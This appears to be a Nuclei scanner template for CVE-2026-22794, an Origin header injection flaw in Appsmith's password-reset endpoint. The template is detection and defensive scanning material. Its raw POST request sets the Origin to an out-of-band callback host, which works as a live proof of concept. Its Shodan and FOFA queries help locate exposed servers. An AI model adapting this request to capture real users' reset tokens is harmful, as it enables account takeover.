id: CVE-2026-22794

info:
  name: Appsmith < 1.93 - Origin Header Injection Account Takeover
  author: ohmygod20260203
  severity: critical
  description: |
    Appsmith prior to version 1.93 is vulnerable to an account takeover via Origin header injection. The server uses the Origin value from request headers as the email link baseUrl without validation in the /forgotPassword and /resendEmailVerification endpoints. An attacker who controls the Origin header can generate password reset or email verification links pointing to an attacker-controlled domain, causing authentication tokens to be exposed and potentially leading to full account takeover.
  impact: |
    An unauthenticated attacker can hijack password reset tokens by injecting a malicious Origin header, leading to full account takeover of any user.
  remediation: |
    Update Appsmith to version 1.93 or later.
  reference:
    - https://github.com/appsmithorg/appsmith/security/advisories/GHSA-7hf5-mc28-xmcv
    - https://github.com/appsmithorg/appsmith/commit/6f9ee6226bac13fb4b836940b557913fff78b633
    - https://nvd.nist.gov/vuln/detail/CVE-2026-22794
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2026-22794
    cwe-id: CWE-346
  metadata:
    verified: true
    max-request: 2
    shodan-query: http.title:"Appsmith"
    fofa-query: title="Appsmith"
    product: appsmith
    vendor: appsmith
  tags: cve,cve2026,appsmith,account-takeover,origin-injection

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /api/v1/users/forgotPassword HTTP/1.1
        Host: {{Hostname}}
        Origin: https://{{interactsh-url}}
        Content-Type: application/json

        {"email":"cve-2026-22794-test@nonexistent-domain-nuclei.com"}

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "appsmith"
        case-insensitive: true

      - type: word
        part: body_2
        words:
          - '"responseMeta"'
          - '"success"'
        condition: and

      - type: status
        part: header_2
        status:
          - 200

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
